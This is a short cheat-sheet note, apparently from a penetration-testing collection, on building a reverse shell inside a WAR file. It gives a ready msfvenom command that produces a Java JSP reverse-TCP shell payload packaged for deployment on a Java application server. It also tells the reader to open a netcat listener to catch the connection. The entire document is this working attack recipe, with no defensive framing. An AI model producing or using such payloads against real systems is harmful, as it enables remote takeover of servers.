# simple_reverse_shell_inside_a_WAR_file
# you gonna use msfvenom for this
# dont forget to start a: nc -lcnp <yourport>

msfvenom -p java/jsp_shell_reverse_tcp LHOST=yourIP LPORT=yourPORT -f war -o revshell.war
